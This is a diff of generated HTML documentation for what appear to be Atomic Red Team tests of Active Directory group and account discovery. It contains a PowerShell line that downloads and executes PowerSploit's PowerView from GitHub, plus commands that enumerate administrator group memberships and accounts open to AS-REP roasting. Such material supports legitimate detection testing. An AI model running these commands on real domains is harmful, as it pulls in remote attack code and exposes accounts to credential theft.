@@ -501,7 +501,50 @@
     </a>
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#id5">
+      <a class="reference internal nav-link" href="#dependencies-run-with-powershell">
+       Dependencies:  Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+       !
+      </a>
+      <ul class="nav section-nav flex-column">
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#description-computer-must-be-domain-joined">
+         Description: Computer must be domain joined.
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#check-prereq-commands">
+         Check Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#get-prereq-commands">
+         Get Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#description-requires-the-active-directory-module-for-powershell-to-be-installed">
+         Description: Requires the Active Directory module for powershell to be installed.
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id5">
+         Check Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id6">
+         Get Prereq Commands:
+        </a>
+       </li>
+      </ul>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id7">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
         <span class="pre">
@@ -571,7 +614,7 @@ information will be displayed.</p>
 <p><strong>Supported Platforms:</strong> windows</p>
 <div class="section" id="attack-commands-run-with-powershell">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#attack-commands-run-with-powershell" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">get-ADPrincipalGroupMembership</span> <span class="c">#{user} | select name</span>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">get-ADPrincipalGroupMembership</span> <span class="n">administrator</span> <span class="p">|</span> <span class="nb">select </span><span class="n">name</span>
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -647,7 +690,7 @@ net group &quot;BUILTIN\Backup Operators&quot; /doma
 <p><strong>Supported Platforms:</strong> windows</p>
 <div class="section" id="id4">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id4" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">IEX </span><span class="p">(</span><span class="nb">IWR </span><span class="s1">&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1&#39;</span><span class="p">);</span> <span class="nb">Find-GPOComputerAdmin</span> <span class="n">-ComputerName</span> <span class="c">#{computer_name} -Verbose```</span>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">IEX </span><span class="p">(</span><span class="nb">IWR </span><span class="s1">&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1&#39;</span><span class="p">);</span> <span class="nb">Find-GPOComputerAdmin</span> <span class="n">-ComputerName</span> <span class="nv">$env:COMPUTERNAME</span> <span class="n">-Verbose</span><span class="p">```</span>
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -663,8 +706,48 @@ net group &quot;BUILTIN\Backup Operators&quot; /doma
 <h3>Atomic Test #7 - Enumerate Users Not Requiring Pre Auth (ASRepRoast)<a class="headerlink" href="#atomic-test-7-enumerate-users-not-requiring-pre-auth-asreproast" title="Permalink to this headline">¶</a></h3>
 <p>When successful, accounts that do not require kerberos pre-auth will be returned</p>
 <p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="dependencies-run-with-powershell">
+<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#dependencies-run-with-powershell" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="description-computer-must-be-domain-joined">
+<h5>Description: Computer must be domain joined.<a class="headerlink" href="#description-computer-must-be-domain-joined" title="Permalink to this headline">¶</a></h5>
+</div>
+<div class="section" id="check-prereq-commands">
+<h5>Check Prereq Commands:<a class="headerlink" href="#check-prereq-commands" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span><span class="p">((</span><span class="nb">Get-CIMInstance</span> <span class="n">-Class</span> <span class="n">Win32_ComputerSystem</span><span class="p">).</span><span class="n">PartOfDomain</span><span class="p">)</span> <span class="p">{</span><span class="n">exit</span> <span class="n">0</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="n">exit</span> <span class="n">1</span><span class="p">}</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="get-prereq-commands">
+<h5>Get Prereq Commands:<a class="headerlink" href="#get-prereq-commands" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Write-Host</span> <span class="n">Joining</span> <span class="n">this</span> <span class="n">computer</span> <span class="n">to</span> <span class="n">a</span> <span class="n">domain</span> <span class="n">must</span> <span class="n">be</span> <span class="n">done</span> <span class="n">manually</span><span class="p">.</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="description-requires-the-active-directory-module-for-powershell-to-be-installed">
+<h5>Description: Requires the Active Directory module for powershell to be installed.<a class="headerlink" href="#description-requires-the-active-directory-module-for-powershell-to-be-installed" title="Permalink to this headline">¶</a></h5>
+</div>
 <div class="section" id="id5">
-<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id5" title="Permalink to this headline">¶</a></h4>
+<h5>Check Prereq Commands:<a class="headerlink" href="#id5" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span><span class="p">(</span><span class="nb">Get-Module</span> <span class="n">-ListAvailable</span> <span class="n">-Name</span> <span class="n">ActiveDirectory</span><span class="p">)</span> <span class="p">{</span><span class="n">exit</span> <span class="n">0</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="n">exit</span> <span class="n">1</span><span class="p">}</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="id6">
+<h5>Get Prereq Commands:<a class="headerlink" href="#id6" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Add-WindowsCapability</span> <span class="n">-Online</span> <span class="n">-Name</span> <span class="s2">&quot;Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0&quot;</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1069</span><span class="o">.</span><span class="mi">002</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">7</span> <span class="o">-</span><span class="n">GetPreReqs</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="id7">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id7" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">get-aduser</span> <span class="o">-f</span> <span class="p">*</span> <span class="n">-pr</span> <span class="n">DoesNotRequirePreAuth</span> <span class="p">|</span> <span class="nb">where </span><span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">DoesNotRequirePreAuth</span> <span class="o">-eq</span> <span class="nv">$TRUE</span><span class="p">}</span>
 </pre></div>
 </div>
